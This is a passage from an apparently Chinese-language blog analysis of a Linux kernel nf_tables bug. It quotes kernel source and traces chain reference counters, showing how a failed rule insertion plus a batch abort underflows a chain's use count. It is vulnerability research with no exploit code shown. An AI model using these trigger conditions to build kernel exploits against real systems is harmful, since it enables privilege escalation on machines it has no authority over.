class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">nft_verdict_init</span><span class="params">(<span class="keyword">const</span> struct nft_ctx *ctx, struct nft_data *data,</span></span></span><br><span class="line"><span class="params"><span class="function">    struct nft_data_desc *desc, <span class="keyword">const</span> struct nlattr *nla)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">u8 genmask = nft_genmask_next(ctx-&gt;net);</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nlattr</span> *<span class="title">tb</span>[<span class="title">NFTA_VERDICT_MAX</span> + 1];</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_chain</span> *<span class="title">chain</span>;</span></span><br><span class="line"><span class="keyword">int</span> err;</span><br><span class="line"></span><br><span class="line">err = nla_parse_nested_deprecated(tb, NFTA_VERDICT_MAX, nla,</span><br><span class="line">  nft_verdict_policy, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (err &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!tb[NFTA_VERDICT_CODE])</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* zero padding hole for memcmp */</span></span><br><span class="line"><span class="built_in">memset</span>(data, <span class="number">0</span>, <span class="keyword">sizeof</span>(*data));</span><br><span class="line">data-&gt;verdict.code = ntohl(nla_get_be32(tb[NFTA_VERDICT_CODE]));</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span> (data-&gt;verdict.code) &#123;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">switch</span> (data-&gt;verdict.code &amp; NF_VERDICT_MASK) &#123;</span><br><span class="line"><span class="keyword">case</span> NF_ACCEPT:</span><br><span class="line"><span class="keyword">case</span> NF_DROP:</span><br><span class="line"><span class="keyword">case</span> NF_QUEUE:</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line">&#125;</span><br><span class="line">fallthrough;</span><br><span class="line"><span class="keyword">case</span> NFT_CONTINUE:</span><br><span class="line"><span class="keyword">case</span> NFT_BREAK:</span><br><span class="line"><span class="keyword">case</span> NFT_RETURN:</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> NFT_JUMP:</span><br><span class="line"><span class="keyword">case</span> NFT_GOTO:</span><br><span class="line"><span class="keyword">if</span> (tb[NFTA_VERDICT_CHAIN]) &#123;</span><br><span class="line">chain = nft_chain_lookup(ctx-&gt;net, ctx-&gt;table,</span><br><span class="line"> tb[NFTA_VERDICT_CHAIN],</span><br><span class="line"> genmask);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (tb[NFTA_VERDICT_CHAIN_ID]) &#123;</span><br><span class="line">chain = nft_chain_lookup_byid(ctx-&gt;net, ctx-&gt;table,</span><br><span class="line">      tb[NFTA_VERDICT_CHAIN_ID],</span><br><span class="line">      genmask);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(chain))</span><br><span class="line"><span class="keyword">return</span> PTR_ERR(chain);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (IS_ERR(chain))</span><br><span class="line"><span class="keyword">return</span> PTR_ERR(chain);</span><br><span class="line"><span class="keyword">if</span> (nft_is_base_chain(chain))</span><br><span class="line"><span class="keyword">return</span> -EOPNOTSUPP;</span><br><span class="line"><span class="keyword">if</span> (nft_chain_is_bound(chain))</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"><span class="keyword">if</span> (desc-&gt;flags &amp; NFT_DATA_DESC_SETELEM &amp;&amp;</span><br><span class="line">    chain-&gt;flags &amp; NFT_CHAIN_BINDING)</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"><span class="keyword">if</span> (!nft_use_inc(&amp;chain-&gt;use))</span><br><span class="line"><span class="keyword">return</span> -EMFILE;</span><br><span class="line"></span><br><span class="line">data-&gt;verdict.chain = chain;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">desc-&gt;len = <span class="keyword">sizeof</span>(data-&gt;verdict);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里首先是解析code，这里就是jump或goto，随后会通过chain的id或者名字找到对应的chain，随后判断chain是否为base chain，chain是否为binding并且已经bound了，然后又对desc做判断是否存在标志位<code>NFT_DATA_DESC_SETELEM</code>，最后对目标chain的use成员加一操作，并且将目标chain放到<code>expr-&gt;data-&gt;verdict.chain</code>中去。</p><p>回到<code>nft_immediate_init</code>函数，会调用<code>nft_parse_register_store</code>函数，这里只需要设置<code>NFTA_IMMEDIATE_DREG</code>为<code>NFT_REG_VERDICT</code>即可进入到后续if分支，并且在<code>nft_parse_register_store</code>只会对goto或jump是否构成死循环做判断。</p><p>继续看<code>nft_immediate_init</code>函数，在进入到最后的if分支中后回先拿到目标chain，然后如果是goto或是jump则会进入<code>nf_tables_bind_chain</code>对chain进行绑定。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">nf_tables_bind_chain</span><span class="params">(<span class="keyword">const</span> struct nft_ctx *ctx, struct nft_chain *chain)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (!nft_chain_binding(chain))</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (nft_chain_binding(ctx-&gt;chain))</span><br><span class="line"><span class="keyword">return</span> -EOPNOTSUPP;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (chain-&gt;bound)</span><br><span class="line"><span class="keyword">return</span> -EBUSY;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!nft_use_inc(&amp;chain-&gt;use))</span><br><span class="line"><span class="keyword">return</span> -EMFILE;</span><br><span class="line"></span><br><span class="line">chain-&gt;bound = <span class="literal">true</span>;</span><br><span class="line">nft_chain_trans_bind(ctx, chain);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先这里如果是目标chain不带有binding标志位则直接退出，接着如果当前chain带有binding也会直接退出，随后就是检查目标chain是否已经绑定，随后对目标chain的use成员加一操作并且将其标记为已绑定。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">chain1-&gt;flags no NFT_CHAIN_BINDING;</span><br><span class="line">chain2-&gt;flags = NFT_CHAIN_BINDING;</span><br><span class="line"></span><br><span class="line">当 chain1 =&gt; chain2 时：</span><br><span class="line">  chain1-&gt;use = <span class="number">1</span></span><br><span class="line">  chain2-&gt;use = <span class="number">2</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">chain1-&gt;flags = NFT_CHAIN_BINDING;</span><br><span class="line">chain2-&gt;flags no NFT_CHAIN_BINDING;</span><br><span class="line"></span><br><span class="line">当 chain1 =&gt; chain2 时：</span><br><span class="line">  chain1-&gt;use = <span class="number">1</span></span><br><span class="line">  chain2-&gt;use = <span class="number">1</span></span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">chain1-&gt;flags no NFT_CHAIN_BINDING;</span><br><span class="line">chain2-&gt;flags no NFT_CHAIN_BINDING;</span><br><span class="line"></span><br><span class="line">当 chain1 =&gt; chain2 时：</span><br><span class="line">  chain1-&gt;use = <span class="number">1</span></span><br><span class="line">  chain2-&gt;use = <span class="number">1</span></span><br></pre></td></tr></table></figure><p>从上述分析可以看到如果让chain1去引用chain2则会引起上述效果。</p><h3 id="nft-rule-expr-deactivate"><a href="#nft-rule-expr-deactivate" class="headerlink" title="nft_rule_expr_deactivate"></a>nft_rule_expr_deactivate</h3><p>在删除一个rule时最终会调用<code>nft_rule_expr_deactivate</code>函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">nft_rule_expr_deactivate</span><span class="params">(<span class="keyword">const</span> struct nft_ctx *ctx, struct nft_rule *rule,</span></span></span><br><span class="line"><span class="params"><span class="function">      <span class="keyword">enum</span> nft_trans_phase phase)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_expr</span> *<span class="title">expr</span>;</span></span><br><span class="line"></span><br><span class="line">expr = nft_expr_first(rule);</span><br><span class="line"><span class="keyword">while</span> (nft_expr_more(rule, expr)) &#123;</span><br><span class="line"><span class="keyword">if</span> (expr-&gt;ops-&gt;deactivate)</span><br><span class="line">expr-&gt;ops-&gt;deactivate(ctx, expr, phase);</span><br><span class="line"></span><br><span class="line">expr = nft_expr_next(expr);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里会首先拿到rule中的第一个expr然后进行循环直到拿完rule中的所有expr。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">nft_immediate_deactivate</span><span class="params">(<span class="keyword">const</span> struct nft_ctx *ctx,</span></span></span><br><span class="line"><span class="params"><span class="function">     <span class="keyword">const</span> struct nft_expr *expr,</span></span></span><br><span class="line"><span class="params"><span class="function">     <span class="keyword">enum</span> nft_trans_phase phase)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">nft_immediate_expr</span> *<span class="title">priv</span> =</span> nft_expr_priv(expr);</span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">nft_data</span> *<span class="title">data</span> =</span> &amp;priv-&gt;data;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_ctx</span> <span class="title">chain_ctx</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_chain</span> *<span class="title">chain</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_rule</span> *<span class="title">rule</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (priv-&gt;dreg == NFT_REG_VERDICT) &#123;</span><br><span class="line"><span class="keyword">switch</span> (data-&gt;verdict.code) &#123;</span><br><span class="line"><span class="keyword">case</span> NFT_JUMP:</span><br><span class="line"><span class="keyword">case</span> NFT_GOTO:</span><br><span class="line">chain = data-&gt;verdict.chain;</span><br><span class="line"><span class="keyword">if</span> (!nft_chain_binding(chain))</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">chain_ctx = *ctx;</span><br><span class="line">chain_ctx.chain = chain;</span><br><span class="line"></span><br><span class="line">list_for_each_entry(rule, &amp;chain-&gt;rules, <span class="built_in">list</span>)</span><br><span class="line">nft_rule_expr_deactivate(&amp;chain_ctx, rule, phase);</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span> (phase) &#123;</span><br><span class="line"><span class="keyword">case</span> NFT_TRANS_PREPARE_ERROR:</span><br><span class="line">nf_tables_unbind_chain(ctx, chain);</span><br><span class="line">fallthrough;</span><br><span class="line"><span class="keyword">case</span> NFT_TRANS_PREPARE:</span><br><span class="line">nft_deactivate_next(ctx-&gt;net, chain);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">nft_chain_del(chain);</span><br><span class="line">chain-&gt;bound = <span class="literal">false</span>;</span><br><span class="line">nft_use_dec(&amp;chain-&gt;table-&gt;use);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (phase == NFT_TRANS_COMMIT)</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> nft_data_release(&amp;priv-&gt;data, nft_dreg_to_type(priv-&gt;dreg));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上述ops中的函数即为<code>nft_immediate_deactivate</code>函数。首先函数内部进入if分支之后回先拿到目标chain，然后如果目标chain不为binding则直接break出这个switch，随后会通过<code>list_for_each_entry</code>循环递归的沿着goto或jump的目标链去deactivate目标chain的rule。</p><p>随后根据不同类型进入到不同分支，当类型为<code>NFT_TRANS_PREPARE_ERROR</code>时会先解绑定目标chain，然后设置目标chain为deactivate。</p><p>如果类型为<code>NFT_TRANS_PREPARE</code>则不会解绑定只会将目标chain设置为deactivate。</p><p>最后就是其余类型的话，会直接将目标chain给del掉，接着对table的use成员减一操作。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">nft_data_release</span><span class="params">(<span class="keyword">const</span> struct nft_data *data, <span class="keyword">enum</span> nft_data_types type)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (type &lt; NFT_DATA_VERDICT)</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line"><span class="keyword">switch</span> (type) &#123;</span><br><span class="line"><span class="keyword">case</span> NFT_DATA_VERDICT:</span><br><span class="line"><span class="keyword">return</span> nft_verdict_uninit(data);</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">WARN_ON(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL_GPL(nft_data_release);</span><br></pre></td></tr></table></figure><p>然后注意的是在函数末尾会调用<code>nft_data_release</code>函数，该函数的主要作用也就是对目标chain的use给减一。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">chain1-&gt;flags no NFT_CHAIN_BINDING;</span><br><span class="line">chain2-&gt;flags = NFT_CHAIN_BINDING;</span><br><span class="line">chain2-&gt;bound = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">当 chain1 =&gt; chain2 时：</span><br><span class="line">  chain1-&gt;use = <span class="number">1</span></span><br><span class="line">  chain2-&gt;use = <span class="number">1</span></span><br><span class="line">  chain2-&gt;bound = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">chain1-&gt;flags = NFT_CHAIN_BINDING;</span><br><span class="line">chain2-&gt;flags no NFT_CHAIN_BINDING;</span><br><span class="line">chain2-&gt;bound = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">当 chain1 =&gt; chain2 时：</span><br><span class="line">  chain1-&gt;use = <span class="number">1</span></span><br><span class="line">  chain2-&gt;use = <span class="number">1</span></span><br><span class="line">  chain2-&gt;bound = <span class="literal">true</span>;</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">chain1-&gt;flags no NFT_CHAIN_BINDING;</span><br><span class="line">chain2-&gt;flags no NFT_CHAIN_BINDING;</span><br><span class="line">choun2-&gt;bound = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">当 chain1 =&gt; chain2 时：</span><br><span class="line">  chain1-&gt;use = <span class="number">1</span></span><br><span class="line">  chain2-&gt;use = <span class="number">1</span></span><br><span class="line">  chain2-&gt;bound = <span class="literal">true</span>;</span><br></pre></td></tr></table></figure><h3 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>漏洞发生在<code>nf_tables_newrule</code>函数内。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">err_destroy_flow_rule:</span><br><span class="line">nft_use_dec_restore(&amp;chain-&gt;use);</span><br><span class="line"><span class="keyword">if</span> (flow)</span><br><span class="line">nft_flow_rule_destroy(flow);</span><br><span class="line">err_release_rule:</span><br><span class="line">nft_rule_expr_deactivate(&amp;ctx, rule, NFT_TRANS_PREPARE_ERROR);</span><br><span class="line">nf_tables_rule_destroy(&amp;ctx, rule);</span><br><span class="line">err_release_expr:</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line"><span class="keyword">if</span> (expr_info[i].ops) &#123;</span><br><span class="line">module_put(expr_info[i].ops-&gt;type-&gt;owner);</span><br><span class="line"><span class="keyword">if</span> (expr_info[i].ops-&gt;type-&gt;release_ops)</span><br><span class="line">expr_info[i].ops-&gt;type-&gt;release_ops(expr_info[i].ops);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">kvfree(expr_info);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> err;</span><br></pre></td></tr></table></figure><p>可以看到的是在发生不正常退出的时候会调用<code>nft_rule_expr_deactivate</code>函数，即上面分析的函数。</p><p>可以知道的是这个函数会致使<code>chain2-&gt;use - 1</code>。</p><p>回到前置知识<code>nfnetlink_rcv_batch</code>中，因为我们在<code>nf_tables_newrule</code>发生了不正确退出导致会给<code>err = ss-&gt;call(...)</code>返回负数，最终status不会等于<code>NFNL_BATCH_DONE</code>，最终会直接调用abort。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> __nf_tables_abort(struct net *net, <span class="keyword">enum</span> nfnl_abort_action action)</span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nftables_pernet</span> *<span class="title">nft_net</span> =</span> nft_pernet(net);</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_trans</span> *<span class="title">trans</span>, *<span class="title">next</span>;</span></span><br><span class="line">LIST_HEAD(set_update_list);</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">nft_trans_elem</span> *<span class="title">te</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (action == NFNL_ABORT_VALIDATE &amp;&amp;</span><br><span class="line">    nf_tables_validate(net) &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> -EAGAIN;</span><br><span class="line"></span><br><span class="line">list_for_each_entry_safe_reverse(trans, next, &amp;nft_net-&gt;commit_list,</span><br><span class="line"> <span class="built_in">list</span>) &#123;</span><br><span class="line"><span class="keyword">switch</span> (trans-&gt;msg_type) &#123;</span><br><span class="line"><span class="comment">// ......</span></span><br><span class="line"><span class="keyword">case</span> NFT_MSG_NEWRULE:</span><br><span class="line"><span class="keyword">if</span> (nft_trans_rule_bound(trans)) &#123;</span><br><span class="line">nft_trans_destroy(trans);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">nft_use_dec_restore(&amp;trans-&gt;ctx.chain-&gt;use);</span><br><span class="line">list_del_rcu(&amp;nft_trans_rule(trans)-&gt;<span class="built_in">list</span>);</span><br><span class="line">nft_rule_expr_deactivate(&amp;trans-&gt;ctx,</span><br><span class="line"> nft_trans_rule(trans),</span><br><span class="line"> NFT_TRANS_ABORT);</span><br><span class="line"><span class="keyword">if</span> (trans-&gt;ctx.chain-&gt;flags &amp; NFT_CHAIN_HW_OFFLOAD)</span><br><span class="line">nft_flow_rule_destroy(nft_trans_flow_rule(trans));</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="comment">// ......</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">nft_set_abort_update(&amp;set_update_list);</span><br><span class="line"></span><br><span class="line">synchronize_rcu();</span><br><span class="line"></span><br><span class="line">list_for_each_entry_safe_reverse(trans, next,</span><br><span class="line"> &amp;nft_net-&gt;commit_list, <span class="built_in">list</span>) &#123;</span><br><span class="line">nft_trans_list_del(trans);</span><br><span class="line">nf_tables_abort_release(trans);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (action == NFNL_ABORT_AUTOLOAD)</span><br><span class="line">nf_tables_module_autoload(net);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">nf_tables_module_autoload_cleanup(net);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因为我们在前面的分析过程中会看到在当chain2的flags为<code>NFT_CHAIN_BINDING</code>时chain2的bound会等于false，当chain2内部有所依就不会进入if分之内，而是进入后面的分支，可是后面会又一次的调用<code>nft_rule_expr_deactivate</code>函数，此时，如果chain2有goto到chain3的rule的话则会导致chain3的use成员出现下溢的情况。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">chain1 =&gt; chain2 =&gt; chain3;</span><br><span class="line">chain2-&gt;rule-&gt;expr0 =&gt; chain3[OK];</span><br><span class="line">chain1-&gt;rule-&gt;expr1 =&gt; chain2[OK];</span><br><span class="line"></span><br><span class="line">此时各chain状态:</span><br><span class="line">chain1-&gt;use = <span class="number">0</span>;</span><br><span class="line">chain2-&gt;use = <span class="number">2</span>;</span><br><span class="line">chain2-&gt;bound = <span class="literal">true</span>;</span><br><span class="line">chain3-&gt;use = <span class="number">1</span>;</span><br><span class="line">chain3-&gt;bound = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">chain1-&gt;rule-&gt;expr2 =&gt; chain2[ERR]; <span class="comment">// 会调用一次 nf_tables_rule_destroy 函数会将 chain2-&gt;use--</span></span><br><span class="line"></span><br><span class="line">此时各chain状态:</span><br><span class="line">chain1-&gt;use = <span class="number">0</span>;</span><br><span class="line">chain2-&gt;use = <span class="number">0</span>;</span><br><span class="line">chain3-&gt;use = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">nf_tables_abort; <span class="comment">// 因为此时只有chain2的rule能够走到 case NFT_MSG_NEWRULE: 分支。</span></span><br><span class="line"></span><br><span class="line">此时各chain状态:</span><br><span class="line">chain1-&gt;use = <span class="number">0</span>;</span><br><span class="line">chain2-&gt;use = <span class="number">0</span>;</span><br><span class="line">chain3-&gt;use = <span class="number">-1</span>;</span><br></pre></td></tr></table></figure><p>如上就是整个过程中各个chain的rule变化。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 